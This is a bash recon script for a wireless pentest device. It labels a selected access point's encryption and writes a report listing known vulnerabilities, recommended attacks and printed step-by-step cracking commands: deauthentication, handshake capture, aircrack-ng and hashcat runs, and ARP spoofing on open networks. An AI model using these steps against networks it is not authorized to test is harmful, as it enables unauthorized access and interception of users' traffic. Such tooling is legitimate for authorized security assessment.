#!/bin/bash
# Title: Encryption Analyzer
# Description: Deep analysis of wireless encryption methods and security configurations
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: Recon

LOG "Encryption Analyzer"
LOG "Analyzing: $_RECON_SELECTED_AP_SSID"

OUTPUT_FILE="/tmp/encryption_analysis_$_RECON_SELECTED_AP_BSSID.txt"

spinner_id=$(START_SPINNER "Analyzing encryption...")

cat > "$OUTPUT_FILE" <<EOF
=== Encryption Security Analysis ===
Target: $_RECON_SELECTED_AP_SSID
BSSID: $_RECON_SELECTED_AP_BSSID
Channel: $_RECON_SELECTED_AP_CHANNEL
Analysis Time: $(date)

Basic Information:
-----------------
Encryption Type: $_RECON_SELECTED_AP_ENCRYPTION_TYPE
Signal Strength: $_RECON_SELECTED_AP_RSSI dBm
Client Count: $_RECON_SELECTED_AP_CLIENT_COUNT

EOF

# Detailed encryption analysis
encryption_type="$_RECON_SELECTED_AP_ENCRYPTION_TYPE"

echo "=== Encryption Details ===" >> "$OUTPUT_FILE"

# Security level assessment
security_level="UNKNOWN"
vulnerabilities=()
recommended_attacks=()

case "$encryption_type" in
    *WPA3*)
        security_level="VERY HIGH"
        echo "Protocol: WPA3" >> "$OUTPUT_FILE"
        echo "Security: State-of-the-art wireless security" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "Features:" >> "$OUTPUT_FILE"
        echo "- SAE (Simultaneous Authentication of Equals)" >> "$OUTPUT_FILE"
        echo "- Forward secrecy" >> "$OUTPUT_FILE"
        echo "- Protection against offline dictionary attacks" >> "$OUTPUT_FILE"
        echo "- Enhanced open (OWE) for open networks" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("Dragonblood vulnerabilities (CVE-2019-9494)")
        vulnerabilities+=("Side-channel attacks on SAE")
        recommended_attacks+=("Social engineering")
        recommended_attacks+=("Evil twin with downgrade attack")
        ;;
    
    *WPA2*Enterprise*|*WPA2*EAP*)
        security_level="HIGH"
        echo "Protocol: WPA2-Enterprise" >> "$OUTPUT_FILE"
        echo "Security: Enterprise-grade with authentication server" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "Features:" >> "$OUTPUT_FILE"
        echo "- 802.1X authentication" >> "$OUTPUT_FILE"
        echo "- RADIUS server backend" >> "$OUTPUT_FILE"
        echo "- Individual user credentials" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("KRACK attack (CVE-2017-13077)")
        vulnerabilities+=("Certificate validation issues")
        vulnerabilities+=("EAP method weaknesses")
        recommended_attacks+=("Fake RADIUS server")
        recommended_attacks+=("Certificate spoofing")
        recommended_attacks+=("Credential harvesting via evil twin")
        ;;
    
    *WPA2*)
        security_level="MEDIUM-HIGH"
        echo "Protocol: WPA2-PSK (Personal)" >> "$OUTPUT_FILE"
        echo "Security: Good for home/small business" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "Features:" >> "$OUTPUT_FILE"
        echo "- Pre-shared key authentication" >> "$OUTPUT_FILE"
        echo "- CCMP encryption (AES-based)" >> "$OUTPUT_FILE"
        echo "- 4-way handshake for key exchange" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("KRACK attack (CVE-2017-13077)")
        vulnerabilities+=("Weak passphrase susceptibility")
        vulnerabilities+=("PMK caching issues")
        vulnerabilities+=("4-way handshake capture vulnerability")
        recommended_attacks+=("Deauth + handshake capture")
        recommended_attacks+=("Offline dictionary/brute force")
        recommended_attacks+=("PMKID attack (hashcat mode 16800)")
        recommended_attacks+=("Evil twin with credential phishing")
        ;;
    
    *WPA*)
        security_level="LOW-MEDIUM"
        echo "Protocol: WPA (Original)" >> "$OUTPUT_FILE"
        echo "Security: Deprecated, should not be used" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "Features:" >> "$OUTPUT_FILE"
        echo "- TKIP encryption" >> "$OUTPUT_FILE"
        echo "- Known vulnerabilities" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("TKIP vulnerabilities")
        vulnerabilities+=("Beck-Tews attack")
        vulnerabilities+=("Chopchop attack")
        vulnerabilities+=("All WPA2 vulnerabilities")
        recommended_attacks+=("TKIP MIC key recovery")
        recommended_attacks+=("Packet injection attacks")
        recommended_attacks+=("Handshake capture + offline crack")
        ;;
    
    *WEP*)
        security_level="VERY LOW"
        echo "Protocol: WEP (Wired Equivalent Privacy)" >> "$OUTPUT_FILE"
        echo "Security: COMPLETELY BROKEN - trivially crackable" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "WARNING: WEP is deprecated since 2004" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("RC4 key stream reuse")
        vulnerabilities+=("Weak IV generation")
        vulnerabilities+=("CRC32 integrity check weakness")
        vulnerabilities+=("Crackable in minutes with enough traffic")
        recommended_attacks+=("Packet injection + IVs capture")
        recommended_attacks+=("ARP replay attack")
        recommended_attacks+=("Caffe-latte attack")
        recommended_attacks+=("Aircrack-ng statistical crack")
        ;;
    
    *Open*|*None*)
        security_level="NONE"
        echo "Protocol: Open Network" >> "$OUTPUT_FILE"
        echo "Security: NO ENCRYPTION" >> "$OUTPUT_FILE"
        echo "" >> "$OUTPUT_FILE"
        echo "WARNING: All traffic is sent in cleartext" >> "$OUTPUT_FILE"
        
        vulnerabilities+=("No encryption - all traffic visible")
        vulnerabilities+=("No authentication required")
        vulnerabilities+=("Easy man-in-the-middle attacks")
        recommended_attacks+=("Traffic sniffing")
        recommended_attacks+=("ARP spoofing")
        recommended_attacks+=("DNS spoofing")
        recommended_attacks+=("SSL stripping")
        ;;
    
    *)
        echo "Protocol: Unknown or Mixed" >> "$OUTPUT_FILE"
        echo "Security: Cannot determine" >> "$OUTPUT_FILE"
        ;;
esac

echo "" >> "$OUTPUT_FILE"
echo "Security Level: $security_level" >> "$OUTPUT_FILE"

# List vulnerabilities
if [ ${#vulnerabilities[@]} -gt 0 ]; then
    echo "" >> "$OUTPUT_FILE"
    echo "=== Known Vulnerabilities ===" >> "$OUTPUT_FILE"
    for vuln in "${vulnerabilities[@]}"; do
        echo "- $vuln" >> "$OUTPUT_FILE"
    done
fi

# Attack recommendations
if [ ${#recommended_attacks[@]} -gt 0 ]; then
    echo "" >> "$OUTPUT_FILE"
    echo "=== Recommended Attack Vectors ===" >> "$OUTPUT_FILE"
    for attack in "${recommended_attacks[@]}"; do
        echo "- $attack" >> "$OUTPUT_FILE"
    done
fi

# Crackability assessment
echo "" >> "$OUTPUT_FILE"
echo "=== Crackability Assessment ===" >> "$OUTPUT_FILE"

case "$security_level" in
    "NONE")
        echo "Crackability: N/A (No encryption to crack)" >> "$OUTPUT_FILE"
        echo "Compromise Time: Immediate" >> "$OUTPUT_FILE"
        echo "Required Tools: Wireshark, tcpdump" >> "$OUTPUT_FILE"
        ;;
    "VERY LOW")
        echo "Crackability: TRIVIAL" >> "$OUTPUT_FILE"
        echo "Compromise Time: Minutes to hours" >> "$OUTPUT_FILE"
        echo "Required Tools: aircrack-ng, aireplay-ng" >> "$OUTPUT_FILE"
        echo "Required Skill: Beginner" >> "$OUTPUT_FILE"
        ;;
    "LOW-MEDIUM")
        echo "Crackability: EASY" >> "$OUTPUT_FILE"
        echo "Compromise Time: Minutes to days (depends on passphrase)" >> "$OUTPUT_FILE"
        echo "Required Tools: aircrack-ng, hashcat, wordlists" >> "$OUTPUT_FILE"
        echo "Required Skill: Beginner-Intermediate" >> "$OUTPUT_FILE"
        ;;
    "MEDIUM-HIGH")
        echo "Crackability: MODERATE" >> "$OUTPUT_FILE"
        echo "Compromise Time: Hours to weeks (depends on passphrase)" >> "$OUTPUT_FILE"
        echo "Required Tools: hashcat, GPU, large wordlists" >> "$OUTPUT_FILE"
        echo "Required Skill: Intermediate" >> "$OUTPUT_FILE"
        ;;
    "HIGH")
        echo "Crackability: DIFFICULT" >> "$OUTPUT_FILE"
        echo "Compromise Time: Weeks to months" >> "$OUTPUT_FILE"
        echo "Required Tools: Specialized tools, RADIUS attacks" >> "$OUTPUT_FILE"
        echo "Required Skill: Advanced" >> "$OUTPUT_FILE"
        ;;
    "VERY HIGH")
        echo "Crackability: VERY DIFFICULT" >> "$OUTPUT_FILE"
        echo "Compromise Time: Months to impractical" >> "$OUTPUT_FILE"
        echo "Required Tools: Cutting-edge research tools" >> "$OUTPUT_FILE"
        echo "Required Skill: Expert" >> "$OUTPUT_FILE"
        ;;
esac

# Client analysis
if [ $_RECON_SELECTED_AP_CLIENT_COUNT -gt 0 ]; then
    echo "" >> "$OUTPUT_FILE"
    echo "=== Client Analysis ===" >> "$OUTPUT_FILE"
    echo "Connected Clients: $_RECON_SELECTED_AP_CLIENT_COUNT" >> "$OUTPUT_FILE"
    echo "- More clients = More handshake opportunities" >> "$OUTPUT_FILE"
    echo "- Active clients enable faster WEP cracking" >> "$OUTPUT_FILE"
    echo "- Clients can be deauthed to force re-authentication" >> "$OUTPUT_FILE"
fi

# Practical attack steps
echo "" >> "$OUTPUT_FILE"
echo "=== Practical Attack Steps ===" >> "$OUTPUT_FILE"

case "$security_level" in
    "NONE")
        cat >> "$OUTPUT_FILE" <<'EOFATTACK'
1. Connect to the open network
2. Run tcpdump or Wireshark to capture traffic
3. Use ARP spoofing to intercept traffic
4. Sniff for credentials, cookies, sensitive data
EOFATTACK
        ;;
    "VERY LOW")
        cat >> "$OUTPUT_FILE" <<'EOFATTACK'
1. Start packet capture: airodump-ng -c CHANNEL --bssid BSSID -w capture
2. Generate traffic: aireplay-ng -3 -b BSSID -h CLIENT wlan0mon
3. Crack: aircrack-ng capture-01.cap
4. Time: 5-30 minutes typically
EOFATTACK
        ;;
    "LOW-MEDIUM"|"MEDIUM-HIGH")
        cat >> "$OUTPUT_FILE" <<'EOFATTACK'
1. Capture handshake:
   - airodump-ng -c CHANNEL --bssid BSSID -w capture
   - aireplay-ng -0 5 -a BSSID wlan0mon (deauth)
2. Verify handshake: aircrack-ng capture-01.cap
3. Convert: hcxpcapngtool -o capture.hc22000 capture-01.cap
4. Crack: hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt
EOFATTACK
        ;;
esac

STOP_SPINNER $spinner_id

LOG "Encryption analysis complete"
LOG "Type: $encryption_type"
LOG "Security: $security_level"
LOG "Vulnerabilities: ${#vulnerabilities[@]}"
LOG "Report: $OUTPUT_FILE"

ALERT "Security: $security_level"
